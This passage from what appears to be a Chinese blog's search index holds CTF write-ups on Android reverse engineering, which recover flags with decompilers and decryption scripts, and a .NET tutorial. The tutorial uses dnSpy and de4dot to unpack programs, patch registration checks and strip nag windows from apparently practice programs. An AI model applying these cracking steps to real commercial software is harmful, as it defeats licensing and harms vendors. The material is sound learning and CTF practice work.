%}\n\n```\n#Tenshine的MD5加密\nb9c77224ff234f27ac6badf83b855c76\n\n#取MD5的奇数位\nflag{bc72f242a6af3857}\n```\n\nmobile2解压后用NotePad++打开`AndroidManifest.xml`就可以看到flag。不知道在考察什么。直接将zip改成apk在模拟器上运行不了，解压后打包说缺少`apktool.yml`所以打包失败。\n\n# 3. Timer\n\n{% asset_img 3.1.png 运行程序 %}\n\n拿去AK看了一下，没有允许动态调试。一般CTF的题如果没有动态调试，说明这道题不是考动态调试so文件的，而且这道题没有输入，断也不知道在哪里断下来，断下来干嘛。那如果so文件拿去IDA看，没有Log语句的话也挺难静态分析的。所以这道题很有可能是直接修改smali文件。\n\n先jeb查看Java源码，因为重点不是so文件，所以可以暂时忽略它了：\n\n{% asset_img 3.2.png jeb分析 %}\n\n{% asset_img 3.3.png jeb分析 %}\n\n因为最后打印flag是将k作为实参传入native方法的，而k是用is2方法求出来的，所以将is2方法运行一下，求出k的值。\n\n```java\npublic class demo{\n\tpublic static boolean is2(int arg4) {\n        boolean v1 = true;\n        if(arg4 > 3) {\n            if(arg4 % 2 != 0 && arg4 % 3 != 0) {\n                int v0 = 5;\n                while(true) {\n                    if(v0 * v0 <= arg4) {\n                        if(arg4 % v0 != 0 && arg4 % (v0 + 2) != 0) {\n                            v0 += 6;\n                            continue;\n                        }\n                        return false;\n                    }\n                    else {\n                        return v1;\n                    }\n                }\n            }\n            v1 = false;\n        }\n        else if(arg4 <= 1) {\n            v1 = false;\n        }\n        return v1;\n    }\n    public static void main(String args[]){\n    \tint time=200000;\n    \tint k=0;\n    \twhile(time>0){\n\t    \tif(is2(time)){\n\t    \t\tk+=100;\n\t    \t}else{\n\t    \t\tk--;\n\t    \t}\n\t    \ttime--;\n\t    }\n    \tSystem.out.println(k);\n    }\n}\n/**\n1616384\n*/\n```\n\n在smali文件修改传入native方法的k的值为1616384，还要将输出flag的条件语句修改为小于0。\n\n{% asset_img 3.4.png 修改smali %}\n\n{% asset_img 3.5.png 修改smali %}\n\n保存，编译，安装，运行。\n\n{% asset_img 3.6.png flag %}\n\n```\nalictf{Y0vAr3TimerMa3te7}\nflag{Y0vAr3TimerMa3te7}\n```\n\n# 4. First_Mobile\n\n在模拟器上运行不了，可能是架构的问题，但这题不需要在页面上显示什么，所以运行不了也没事。\n\n载入jeb分析：\n\n{% asset_img 4.1.png jeb分析 %}\n\n{% asset_img 4.2.png jeb分析 %}\n\n调整一下encode类：\n\n```java\nclass encode {\n    private static byte[] b;\n\n    static {\n        encode.b = new byte[]{23, 22, 26, 26, 25, 25, 25, 26, 27, 28, 30, 30, 29, 30, 32, 32};\n    }\n\n    public encode() {\n        super();\n    }\n\n    public static void check(String arg7) {\n        int v6 = 16;\n        byte[] v1 = arg7.getBytes();\n        byte[] v3 = new byte[v6];\n        int i,j;\n        byte[] v5 = new byte[v6];\n        for(j=0; j<v1.length; j++)\n        {\n\t        for(i = 0; i < v6; ++i) {\n\t            v3[i] = ((byte)((v1[j] + encode.b[i]) % 61));\n\t            v3[i] = ((byte)(v3[i] * 2 - i));\n\t            if (v3[i] == v1[j])\n\t            {\n\t            \tv5[i] = v3[i];\n\n\t            }\n\t        }\n        }\n        String str = new String (v5);\n        System.out.println(str);\n    }\n}\npublic class AES_128\n{\n\n    public static void main(String[] args)\n    {\n    \tencode enc = new encode();\n    \tString arg7 = \"ABCDEFGHJIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890{}_\";\n    \tenc.check(arg7);\n    }\n}\n/**\nLOHILMNMLKHILKHI\n*/\n```\n\n所以flag为：\n\n```\nXMAN{LOHILMNMLKHILKHI}\n```\n\n# 5. easy_100\n\n虽然在模拟器不能运行，但没root的手机也可以从电脑上安装app。\n\n{% asset_img 5.1.jpg 运行程序 %}\n\n在AK中看到没有so文件，也不用动态调试。jeb分析，因为有混淆，所以看起来还挺费力。\n\n{% asset_img 5.2.png jeb分析 %}\n\n将图片用Winhex打开，144=90h，所以v=\"this_is_the_key.\"。\n\n{% asset_img 5.3.png jeb分析 %}\n\n{% asset_img 5.4.png jeb分析 %}\n\n{% asset_img 5.5.png jeb分析 %}\n\n{% asset_img 5.6.png jeb分析 %}\n\n密文与数组比较。现在理一下思路：key经过小端存储作为密钥，输入的文本串经AES_ECB模式和密钥加密后得到需要比较的数组。所以我们现在想逆向回去找文本串，需要将key转换成密钥，再利用ECB解密数组，得到flag。编写脚本：\n\n```java\npackage v5le0n9;\nimport java.io.IOException;\nimport java.security.InvalidKeyException;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.BadPaddingException;\nimport javax.crypto.Cipher;\nimport javax.crypto.IllegalBlockSizeException;\nimport javax.crypto.NoSuchPaddingException;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class demo {\n    public static void main(String[] args) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {\n        StringBuilder v1 = new StringBuilder();\n        int v0_1;\n        String v0_2;\n        String arg4 = \"this_is_the_key.\";    //在winhex中发现\n        for(v0_1 = 0; v0_1 < arg4.length(); v0_1 += 2) {  //对KEY进行二次变换，这是有类c中的函数分析得到的\n            v1.append(arg4.charAt(v0_1 + 1));\n            v1.append(arg4.charAt(v0_1));\n        }\n        v0_2 = v1.toString();\n        byte key[] = v0_2.getBytes();     //转换成Bytes数组\n        SecretKeySpec a;\n        Cipher b;\n        a = new SecretKeySpec(key, \"AES\");\n        b = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n        byte flag[] = {21, -93, -68, -94, 86, 117, -19, -68,\n                -92, 33, 50, 118, 16, 13, 1, -15, -13, 3, 4, 103, -18, 81, 30, 68, 54, -93, 44, -23,\n                93, 98, 5, 59};\n        b.init(Cipher.DECRYPT_MODE,a);    //这里注意前面的参数，选择相应的解密参数\n\n        String AES_decode = new String(b.doFinal(flag),\"utf-8\");\n        System.out.println(AES_decode);\n    }\n}\n/**\nLCTF{1t's_rea1ly_an_ea3y_ap4}\n*/\n```\n\n# 6. HelloSmali2\n\n将java文件运行一下就有答案。\n\n```\neM_5m4Li_i4_Ea5y\nXMAN{eM_5m4Li_i4_Ea5y}\n```\n\n","categories":["Android逆向"],"tags":["Reverse","CTF"]},{"title":".Net逆向教程","url":"/posts/784f7e1d.html","content":"\n`.Net`程序载入OD直接就运行起来了，完全没给我们调试的机会。针对这种程序，其实有专门的调试软件，比如dnSpy。其实调试流程跟OD差不多，在此只是熟悉一下dnSpy的运用。\n\n这个笔记是跟着up主muruoxi学习`.Net`逆向，[这是她的.Net逆向专栏](https://www.bilibili.com/read/readlist/rl73962?spm_id_from=333.999.0.0) 。\n\n<!--more-->\n\n# 1. 静态分析\n\n拿去查壳，发现它是C#写32位的.net程序。\n\n{% asset_img 1.1.png 查壳 %}\n\n{% asset_img 1.2.png 运行程序 %}\n\n载入dnSpy，编辑 -> 搜索程序集，选择搜索数字/字符串，输入“登陆失败”，就可以定位到代码处。\n\n{% asset_img 1.3.png dnSpy分析 %}\n\n这个看起来是不是特别像Java写的程序，C#我没接触过，但C#跟Java很像我是见识到了。程序逻辑很简单，如果文本框1的文本长度为-1则登录成功。很明显这是不可能实现的。我们的目的就是要修改这个if语句。在这个方法内右键 -> 编辑方法。修改完后点击编译。\n\n{% asset_img 1.4.png 修改代码 %}\n\n文件 -> 全部保存，确定。\n\n{% asset_img 1.5.png 保存 %}\n\n此时，再次打开原程序，无论输入什么都显示“登录成功”。\n\n{% asset_img 1.6.png 登录成功 %}\n\n# 2. 动态调试\n\nC#写32位的.net程序，无壳。载入dnSpy读代码。\n\n{% asset_img 2.1.png 运行程序 %}\n\n超级简单，注册码就是用户名的RSA值。\n\n{% asset_img 2.2.png dnSpy分析 %}\n\n那这个RSA怎么得到？使用动态调试。选中第22行F9下断或右键 -> 添加断点。\n\n{% asset_img 2.3.png dnSpy分析 %}\n\nF5开始调试，此时dnSpy显示在运行中。输入用户名与注册码后，点击按钮，dnSpy停在断点处。\n\n{% asset_img 2.4.png dnSpy分析 %}\n\n但此时`text`和`text2`的值都为空，F11步入，F10步过，两次F10之后，`text`和`text2`的值都出来了。\n\n{% asset_img 2.5.png dnSpy分析 %}\n\n`text`中的值就是我们需要的RSA值。选中`text`行，右键 -> 复制值，将引号去掉，就是v5le0n9对应的注册码。\n\n```\nWgvOIwqEgAHU+Kfq6nVDMXbRw4SzUDh2RUOIjkwwEajSmRXuuRFZRV173AZum6hXx6USTCMIsCnQnpQjKpf7Q0efrYzsjnuEkOU0BGUs+SUWBS3dFCpNcLdqLp6UNIM1bJp4l+P0kDdSWHdJzGFdBUEkmQteAp3Dfbf+B3r8q70=\n```\n\n取消断点，F5继续。将正确的注册码填上，左上角已经显示“已注册”字样。\n\n{% asset_img 2.6.png dnSpy分析 %}\n\n但是不知道如何保存这个“已注册”的状态，因为它每次的RSA值都会变。\n\n那我只能爆破了，将“==”修改为“!=”。\n\n# 3. 壳与脱壳\n\n载入DIE发现有.NET Reactor(4.8-4.9)的壳，.NET壳非常好脱，用de4dot就可轻松脱去。\n\n{% asset_img 3.1.png .net壳 %}\n\n将需要脱壳的程序拖进`de4dot.exe`程序，在程序本目录下就会生成一个已脱壳程序。拿去DIE查壳，壳已经去掉了。\n\n{% asset_img 3.2.png 脱壳 %}\n\n将两个程序载入dnSpy查看区别。发现加壳程序会有一些乱码的类。\n\n{% asset_img 3.3.png dnSpy分析 %}\n\n运行脱壳程序熟悉一下流程。搜索关键字符串定位函数。\n\n{% asset_img 3.4.png dnSpy分析 %}\n\n第一种方法：通过爆破，无论输入什么都显示已注册。\n\n{% asset_img 3.5.png dnSpy分析 %}\n\n{% asset_img 3.6.png 已注册 %}\n\n第二种方法：获取注册码。\n\n在if语句处下断，运行，发现value值出不来，up主说是编译器优化问题，暂时还没有好的解决办法。\n\n{% asset_img 3.7.png dnSpy分析 %}\n\n# 4. 修改程序内容\n\n有壳，直接拿去de4dot脱壳。脱壳失败，让我们使用最新版的de4dot。\n\n{% asset_img 4.1.png 脱壳失败 %}\n\n去爱盘下载了个最新版的，不错，好用！\n\n{% asset_img 4.2.png 脱壳成功 %}\n\n这次的目标是要修改程序的内容，那就修改一下标题，修改成我不过分吧嘿嘿。\n\n{% asset_img 4.3.png 运行程序 %}\n\n载入dnSpy，搜索需要修改的字符串。\n\n{% asset_img 4.4.png dnSpy分析 %}\n\n一样，右键 -> 修改方法。编译，保存。锵锵~修改成功！\n\n{% asset_img 4.5.png 修改标题 %}\n\n# 5. 调用堆栈\n\n程序无壳，运行一下程序，程序3秒后自动退出，退出会有一个提示。\n\n{% asset_img 5.1.png 运行程序 %}\n\n这像不像退出时出现的NAG窗口。可以查看 [调试器使用教程实验六中的去除软件关闭后弹出的广告](https://v5le0n9.github.io/posts/33a085c7.html#13-%E5%AE%9E%E9%AA%8C%E5%85%AD-VisualSite-Designer) 。\n\n这个程序一样，运行到弹窗后按暂停键。调试 -> 窗口 -> 调用堆栈，查看堆栈窗口，找到在程序领空的。\n\n{% asset_img 5.2.png dnSpy分析 %}\n\n倒着来一个个看，第一个`Form1_FormClosing`是弹窗内容。不是什么重要函数。\n\n{% asset_img 5.3.png dnSpy分析 %}\n\n第二个是有关时间的函数。很有可能是这个，因为3s后自动结束就是用了时间计数器。\n\n{% asset_img 5.4.png dnSpy分析 %}\n\n第三个是main函数，里面没有计数的内容。\n\n{% asset_img 5.5.png dnSpy分析 %}\n\n将第二个方法的退出函数注释，编译保存。重新运行程序，发现3s后没有退出程序，但关闭还是有NAG窗口。用同样方法注释掉即可。\n\n也可以在main函数中一直进去进到`InitializeComponent`方法，注释掉使用一二函数的代码，就可实现既无倒数也无NAG窗口。\n\n{% asset_img 5.6.png dnSpy分析 %}\n\n# 6. Main函数\n\n在没有任何敏感字符串和NAG窗口的情况下，只能进入main函数一探究竟。\n\n{% asset_img 6.1.png 运行程序 %}\n\nmain函数如何进入？也是用5的方法调用堆栈。一直进入到`InitializeComponent`方法，分析。\n\n{% asset_img 6.2.png dnSpy分析 %}\n\n右键label2 -> 分析，查看分析器，label2被timer1使用到了。\n\n{% asset_img 6.3.png dnSpy分析 %}\n\n注释掉随机函数，修改为自己想要的文本。\n\n{% asset_img 6.4.png dnSpy分析 %}\n\n{% asset_img 6.5.png 修改文本 %}\n\n# 7. 打不开的程序\n\n运行一下，程序打开不了。查壳无壳，载入dnSpy查看函数。发现在main函数调用了程序关闭函数，导致程序一打开直接运行到关闭函数自动关闭自己。\n\n{% asset_img 7.1.png dnSpy分析 %}\n\n那就直接注释掉main函数调用关闭函数那一行。\n\n{% asset_img 7.2.png 打开程序 %}\n\n# 8. 修改程序内容2.0\n\n拿去查壳，无壳，64位.net程序，载入dnSpy。\n\n{% asset_img 8.1.png dnSpy分析 %}\n\n发现它与我们之前调试的程序有点不一样。搜索字符串无果。找到main函数分析一下。\n\n{% asset_img 8.2.png dnSpy分析 %}\n\n查看`.baml`文件，右键发现没有编辑方法功能，但可以使用十六进制编辑器修改内容。\n\n{% asset_img 8.3.png dnSpy分析 %}\n\n右键 -> 打开十六进制编辑器。Ctrl + F 搜索，好像不能输入中文，但可以粘贴中文。确保找到的地方是我们要修改的地方，随意修改可能会出现问题。\n\n建议修改的比原来的字节数要少，因为怕溢出。系统用00填充未修改的字节。\n\n{% asset_img 8.4.png 修改内容 %}\n\n{% asset_img 8.5.png 修改内容 %}\n\n文件 -> 全部保存。\n\n{% asset_img 8.6.png 修改成功 %}\n\n# 9. de4dot反混淆\n\n还没有找到合适的程序，暂时先到这里吧。","categories":["Windows逆向"],"tags":["Reverse"]},{"title":"攻防世界 Android逆向合集","url":"/posts/9f62af2.html","content":"\n# 1. app1\n\n这道题之前做过，也没什么难度，所以不想再说了。这道题的一个知识点就是程序自身的版本号版本名在BuildConfig中存储。\n\n{% asset_img 1.1.png jeb分析 %}\n\n<!--more-->\n\n```java\npackage v5le0n9;\npublic class demo {\n    public static void main(String[] args){\n    \tString v3 = \"X<cP[?PHNB<P?aj\";\n    \tint len = v3.length();\n    \tint v4 = 15;\n    \tint v0;\n    \tint[] v5 = new int[len];\n    \tfor(v0=0; v0<len; v0++)\n    \t{\n    \t    v5[v0] = v3.charAt(v0) ^ v4;\n    \t    System.out.printf(\"%c\",v5[v0]);\n    \t}\n    }\n}\n/**\nW3l_T0_GAM3_0ne\n*/\n```\n\n# 2. app2\n\n{% asset_img 2.1.png 运行程序 %}\n\n载入AK由so文件，程序可动态调试。载入jeb查看Java源码。\n\n{% asset_img 2.2.png jeb分析 %}\n\n{% asset_img 2.3.png Logcat %}\n\n{% asset_img 2.4.png Logcat %}\n\n{% asset_img 2.5.png jeb分析 %}\n\n将x86目录下的so文件载入IDA32，在Exports表里找到`doRawData`函数，查看伪代码。\n\n{% asset_img 2.6.png IDA分析 %}\n\npython3解决from Crypto.Cipher import AES报错问题：https://www.dandelioncloud.cn/article/details/1018083534028833 \n\n```python\nimport base64\nfrom Crypto.Cipher import AES\ncipher=base64.b64decode(\"VEIzd/V2UPYNdn/bxH3Xig==\")\nkey = \"thisisatestkey==\".encode(\"utf-8\")\naes = AES.new(key,AES.MODE_ECB)\nmsg = aes.decrypt(cipher)\nprint(msg.decode(\"utf-8\"))\n'''\naimagetencent\u0003\u0003\u0003\n'''\n```\n\n发现这个也不是flag。再分析一下XML文件。还有`FileDataActivity`我们还没有分析。\n\n{% asset_img 2.7.png jeb分析 %}\n\n```python\nimport base64\nfrom Crypto.Cipher import AES\ncipher=base64.b64decode(\"9YuQ2dk8CSaCe7DTAmaqAA==\")\nkey = \"thisisatestkey==\".encode(\"utf-8\")\naes = AES.new(key,AES.MODE_ECB)\nmsg = aes.decrypt(cipher)\nprint(msg.decode(\"utf-8\"))\n'''\nCas3_0f_A_CAK3\n'''\n```\n\n所以这题到底怎么转换到`FileDataActivity`去的，迷惑。\n\n# 3. app3\n\n下载下来是一个`.ab`文件，`.ab`文件是 Android 系统的备份文件格式，它分为加密和未加密两种类型。`.ab`文件的前 24 个字节是类似文件头的东西，如果是加密的，在前 24 个字节中会有 AES-256 的标志，如果未加密，则在前 24 个字节中会有 none 的标志。\n\n{% asset_img 3.1.png 文件头 %}\n\n下载`abe.jar`，将`.ab`文件解压。在abe目录下运行cmd。\n\n```\njava -jar abe.jar unpack C:\\Users\\dell\\Desktop\\app3.ab app3.tar\n```\n\n`.tar`文件在Windows也可解压。找到`.apk`文件安装到模拟器，又运行不了。\n\n{% asset_img 3.2.png jeb分析 %}\n\n{% asset_img 3.3.png jeb分析 %}\n\n因为没有跳转语句，无论输入什么都是出来这句话。再看看有什么隐藏的`<activity>`，发现也只有我们分析过的那两个。\n\n{% asset_img 3.4.png jeb分析 %}\n\n再去那两个`<activity>`仔细分析我们刚才没有分析的，肯定是有什么遗漏了。\n\n{% asset_img 3.5.png jeb分析 %}\n\n{% asset_img 3.6.png jeb分析 %}\n\n{% asset_img 3.7.png jeb分析 %}\n\n{% asset_img 3.8.png jeb分析 %}\n\n{% asset_img 3.9.png jeb分析 %}\n\n{% asset_img 3.10.png jeb分析 %}\n\n{% asset_img 3.11.png jeb分析 %}\n\n{% asset_img 3.12.png jeb分析 %}\n\n{% asset_img 3.13.png jeb分析 %}\n\n{% asset_img 3.14.png jeb分析 %}\n\n{% asset_img 3.15.png jeb分析 %}\n\nSHA1=\"Stra1234\" + \"44e2e4457d4e252ca5b9fe9d20b3fea5\" + \"yaphetshan\"= ae56f99638285eb0743d8bf76d2b0c80e5cbb096，取前7位就是ae56f99。\n\n我们刚才说的有加密，是用SqlCipher加密的，而这个就是数据库的密码。\n\n解压包除`.apk`文件之外，还有两个`.db`文件，一个`Demo.db`，另一个是`Encrypt.db`，因为在Java代码里面是`Demo.db`，所以解密也应该是解密这一个。\n\n安装sqlcipher用来解密数据库，上面分析写着版本为`3.4.0`，Linux注意对应版本，Windows下载最新也就`3.0.1`，所以没问题。\n\n```\nE:\\sqlcipher-3.0.1\\bin>sqlcipher-shell64.exe Demo.db\nsqlite> PRAGMA key = \"ae56f99\";\nsqlite> ATTACH DATABASE 'app3_1.db' AS plaintext KEY \"\";\nsqlite> SELECT sqlcipher_export(\"plaintext\");\n\nsqlite> DETACH DATABASE plaintext;\nsqlite>\n```\n\n安装SQLite数据库：https://nightlies.sqlitebrowser.org/latest/ \n\nSQLite用来打开解密后的`.db`文件，加密的`.db`文件SQLite打不开，也就是为什么我们要解密数据库的原因。\n\n{% asset_img 3.16.png 数据库 %}\n\n结果不是...那我们再试试`Encryto.db`。\n\n{% asset_img 3.17.png 数据库 %}\n\n很明显的Base64，拿去解码得：\n\n```\nVGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=\n\nTctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}\n```\n\n# 4. easy_apk\n\n{% asset_img 4.1.png 运行程序 %}\n\n载入AK没发现lib文件，载入jeb查看源码：\n\n{% asset_img 4.2.png jeb分析 %}\n\n天真的我就拿去Base64解码了，结果解码失败。回来再看，它是新Base64，点进去查看它的算法，发现它是把索引表给替换了。\n\n拿Base64变种脚本替换索引表即可。\n\n```python\nimport base64\nimport string\n# base 字符集\n# base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\nbase64_charset = \"vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/\"\n\ndef encode(origin_bytes):\n\n     # 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位\n    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]\n     \n    resp = ''\n    nums = len(base64_bytes) // 3\n    remain = len(base64_bytes) % 3     \n    integral_part = base64_bytes[0:3 * nums]\n    \n    while integral_part:\n         # 取三个字节，以每6⽐特，转换为4个整数\n         tmp_unit = ''.join(integral_part[0:3])\n         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]\n         # 取对应base64字符\n         resp += ''.join([base64_charset[i] for i in tmp_unit])\n         integral_part = integral_part[3:]\n    \n    if remain:\n         # 补⻬三个字节，每个字节补充 0000 0000\n         remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n         # 取三个字节，以每6⽐特，转换为4个整数\n         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=\n         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]\n         resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='\n    \n    return resp\n\ndef decode(base64_str):\n    if not valid_base64_str(base64_str):\n        return bytearray()\n    \n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b','')) for s in base64_str if s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n    \n    while integral_part:\n         # 取4个6位base64字符，作为3个字节\n         tmp_unit = ''.join(integral_part[0:4])\n         tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n         for i in tmp_unit:\n            resp.append(i)\n         integral_part = integral_part[4:]\n \n    if remain:\n         remain_part = ''.join(base64_bytes[nums * 4:])\n         tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n         for i in tmp_unit:\n         \tresp.append(i)\n    return resp\n\ndef valid_base64_str(b_str):\n    if len(b_str) % 4:\n     \treturn False\n    for m in b_str:\n     \tif m != \"=\" and m not in base64_charset:\n     \t\treturn False\n    return True\n\nif __name__ == '__main__':\n     local_base64 = \"5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=\"\n     print('使用本地base64解密：', decode(local_base64).decode())\n'''\n使用本地base64解密： 05397c42f9b6da593a3644162d36eb01\n'''\n```\n\n```\nflag{05397c42f9b6da593a3644162d36eb01}\n```\n\n# 5. RememberOther\n\n运行一下程序。\n\n{% asset_img 5.1.png 运行程序 %}\n\n拿去AK，没有看到需要动态调试的so文件。\n\n拿去jeb分析代码：\n\n{% asset_img 5.2.png jeb分析 %}\n\n{% asset_img 5.3.png jeb分析 %}\n\n那我们试试直接点注册。\n\n{% asset_img 5.4.png 出现MD5值 %}\n\nMD5的奇数位为`b216ebb92fa5caf6`，再将MD5值解密，解出来为`YOU_KNOW_`(究竟哪个网站可以免费解MD5，我还是看牛牛们的wp才知道是这个答案)。拿到程序去验证没错。`YOU_KNOW_`很明显是flag形式，后面还缺了些东西，出题人给了剩下的线索。\n\n{% asset_img 5.5.png 线索 %}\n\n你懂！你懂安卓！\n\n```\nYOU_KNOW_ANDROID\n```\n\n# 6. easyjni\n\n这道题看名字就知道考察jni。\n\n{% asset_img 6.1.png 运行程序 %}\n\n载入AK，看到lib目录下有`libnative.so`文件，是armeabi-v7a架构的。载入jeb，代码混淆了，没关系一个个方法分析。\n\n在判断语句，调用了MainActivity.a方法，其中一个实参就是我们输入的内容。MainActivity.a方法返回到私有a方法里，形参是我们输入的内容。再看私有a方法，调用了ncheck()方法。\n\n{% asset_img 6.2.png jeb分析 %}\n\n调用ncheck()方法前，还创建了一个a类对象，先进去看看a类的a方法。发现是变种Base64加密。\n\n{% asset_img 6.3.png jeb分析 %}\n\n将apk文件解包，将里面的so文件载入IDA。\n\n```\nC:\\Users\\dell\\Desktop>apktool d easyjni.apk\nI: Using Apktool 2.6.1 on easyjni.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: C:\\Users\\dell\\AppData\\Local\\apktool\\framework\\1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n\n在Export模块找到ncheck()方法。\n\n{% asset_img 6.4.png IDA分析 %}\n\n{% asset_img 6.5.png IDA分析 %}\n\n哇这就有点恶心人了哈，我从没见过等号在中间的。仔细分析一下IDA源码，原来不过如此。\n\n{% asset_img 6.6.png IDA分析 %}\n\n```\nMbT3sQgX039i3g==AQOoMQFPskB1Bsc7\n\n# i和i+1对换\nbM3TQsXg30i9g3==QAoOQMPFks1BsB7c\n\n# 前16位与后16位对换\nQAoOQMPFks1BsB7cbM3TQsXg30i9g3==\n```\n\n再用4中的变种Base64脚本解决。\n\n```python\nimport base64\nimport string\n# base 字符集\n# base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\nbase64_charset = \"i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN\"\n\ndef encode(origin_bytes):\n\n     # 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位\n    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]\n     \n    resp = ''\n    nums = len(base64_bytes) // 3\n    remain = len(base64_bytes) % 3     \n    integral_part = base64_bytes[0:3 * nums]\n    \n    while integral_part:\n         # 取三个字节，以每6⽐特，转换为4个整数\n         tmp_unit = ''.join(integral_part[0:3])\n         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]\n         # 取对应base64字符\n         resp += ''.join([base64_charset[i] for i in tmp_unit])\n         integral_part = integral_part[3:]\n    \n    if remain:\n         # 补⻬三个字节，每个字节补充 0000 0000\n         remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n         # 取三个字节，以每6⽐特，转换为4个整数\n         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=\n         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]\n         resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='\n    \n    return resp\n\ndef decode(base64_str):\n    if not valid_base64_str(base64_str):\n        return bytearray()\n    \n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b','')) for s in base64_str if s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n    \n    while integral_part:\n         # 取4个6位base64字符，作为3个字节\n         tmp_unit = ''.join(integral_part[0:4])\n         tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n         for i in tmp_unit:\n            resp.append(i)\n         integral_part = integral_part[4:]\n \n    if remain:\n         remain_part = ''.join(base64_bytes[nums * 4:])\n         tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n         for i in tmp_unit:\n         \tresp.append(i)\n    return resp\n\ndef valid_base64_str(b_str):\n    if len(b_str) % 4:\n     \treturn False\n    for m in b_str:\n     \tif m != \"=\" and m not in base64_charset:\n     \t\treturn False\n    return True\n\nif __name__ == '__main__':\n     local_base64 = \"QAoOQMPFks1BsB7cbM3TQsXg30i9g3==\"\n     print('使用本地base64解密：', decode(local_base64).decode())\n'''\n使用本地base64解密： flag{just_ANot#er_@p3}\n'''\n```\n\n# 7. easy-so\n\n运行程序。\n\n{% asset_img 7.1.png 运行程序 %}\n\n看题目，肯定有so文件，载入AK发现4种架构都有，可以快乐地玩耍了。\n\n载入jeb分析源码。\n\n{% asset_img 7.2.png jeb分析 %}\n\n{% asset_img 7.3.png jeb分析 %}\n\n我们需要做的就是将CheckString方法的返回值为1。解包，用x86架构的so文件载入IDA。因为我用的模拟器是x86架构的。\n\n{% asset_img 7.4.png IDA分析 %}\n\n这个与6的题目考点几乎一模一样，只是没了变种Base64的过程。\n\n```\nf72c5a36569418a20907b55be5bf95ad\n\n# i与i+1对换\n7fc2a5636549812a90705bb55efb59da\n\n# 前16位与后16位对换\n90705bb55efb59da7fc2a5636549812a\n```\n\n拿去程序里运行验证一下，验证通过。\n\n{% asset_img 7.5.png 验证通过 %}\n\n```\nflag{90705bb55efb59da7fc2a5636549812a}\n```\n\n# 8. easyjava\n\n运行一下程序。\n\n{% asset_img 8.1.png 运行程序 %}\n\n载入jeb分析：\n\n{% asset_img 8.2.png jeb分析 %}\n\n将b类和a类所有方法都分析一遍，反正后面也要用到。\n\n{% asset_img 8.3.png b类 %}\n\n{% asset_img 8.4.png b类 %}\n\n{% asset_img 8.5.png a类 %}\n\n{% asset_img 8.6.png a类 %}\n\n回到MainActivity类，b.b和a.a的作用一样，都是以参数为边界，对换各自的c整形列表，所以v4和v5都应该是对换后的列表。经过分析a类和b类发现并没有增加或减少原本的长度，所以v2的长度就应该等于v3的长度，v3的长度从字符串中可以计算到是12，所以循环要经历12次。\n\n以v2索引值为0的值为例，将v2索引值为0的值传入b.a方法，如果这个值可以转换成小写字母，则把b.b小写字母表中相同的小写字母的索引值取出，与a列表(也就是v4)的数组元素对比，如果取出的索引值与a列表中某个元素相同，则返回元素的索引值。更新b.a列表和b.b小写字母表，都是首位放最末位。将返回的a列表元素的索引值作为参数传入a.a方法，如果这个形参与a列表中(也就是v5)的元素相同，取出这个元素的索引值，作为a.b小写字母表中的索引，返回该索引的元素，也就是“w”。\n\n用Python写出来相当于`a_alphabet[v5.index(v4.index(b_alphabet.index(ans[0])))] = w`\n\n现在我们要做的就是把这个过程逆回来。\n\n```python\nv4 = [17,23,7,22,1,16,6,9,21,0,15,5,10,18,2,24,4,11,3,14,19,12,20,13,8,25]\nv5 = [21,4,24,25,20,5,15,9,17,6,13,3,18,12,10,19,0,22,2,11,23,1,8,7,14,16]\nflag = \"wigwrkaugala\"\nans = \"\"\nb_alphabet = 